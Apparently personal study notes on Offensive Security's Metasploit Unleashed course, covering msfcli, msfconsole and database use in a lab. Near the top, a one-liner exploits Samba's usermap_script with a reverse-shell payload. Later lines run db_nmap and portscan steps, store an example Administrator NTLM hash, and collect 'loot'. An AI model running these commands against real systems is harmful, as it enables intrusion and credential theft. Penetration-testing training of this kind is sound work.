# metasploit-unleashed  
### offensive security explanation of metasploit  
#### assuming you have all the requirements to get going 

### What is the msfcli?
The msfcli provides a powerful command line interface to the framework. This allows you to easily add Metasploit exploits into any scripts you may create.  
```
root@kali:~# msfconsole -x "use exploit/multi/samba/usermap_script;\
set RHOST 172.16.194.172;\
set PAYLOAD cmd/unix/reverse;\
set LHOST 172.16.194.163;\
run"
```
### running the cli
`msfcli -h`  
Usage: /usr/bin/msfcli  >option=value> [mode]  
*Note: when using msfcli, variables are assigned using the “equal to” operator = and that all options are case-sensitive.*  
 **for help** or your not sure what to do next append the letter ‘O‘.  
`msfcli exploit/multi/samba/usermap_script O` 

To display available payloads append the letter ‘P‘.
`msfcli exploit/multi/samba/usermap_script P`  

```
The only real drawback of msfcli is that it is not supported quite as well as msfconsole and it can only handle one shell at a time, making it rather impractical for client-side attacks. It also doesn’t support any of the advanced automation features of msfconsole.
```

## Msfconsole Commands
[https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/](msfconsole)  
too many to list all of them here

## Using Metasploit DB 
1. `service postgresql start`  
2. `msfdb init`  
3. `msfconsole`  
4. `msf > db_status`  
5. `msf > workspace`  -h  
6. `msf > workspace -a lab1`  adds new  
7. `msf help`  
8. `msf > db_import /root/file-to-scan/  
9. `msf > hosts`  
10. `msf > db_nmap -A ip-address-to-scan  
11. `msf > db_export -h`  help exporting data  
12. `msf > hosts -h`  
13. `msf > hosts -c address,os_flavor`  or append -S Linux  
14. `msf > use auxiliary/scanner/portscan/tcp`  
15. `msf auxiliary(tcp) > show options`  
16. `msf  auxiliary(tcp) > hosts -c address,os_flavor -S Linux -R`  
17. `msf  auxiliary(tcp) > hosts -R`   
18. `msf > services -h`  
19. `msf > services -c name,info 172.16.194.134`  append -S http  
20. `msf > services -s http -c port 172.16.194.134 -o /root/msfu/http.csv`  export to .CSV  
21. `msf > creds`  stores any credentials saved along the way.  
22. `msf > creds -a 172.16.194.134 -p 445 -u Administrator -P 7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::`  ex.
23. `msf > loot -h`  
24. `msf  exploit(usermap_script) > exploit`  how one would populate the db with some 'loot'  
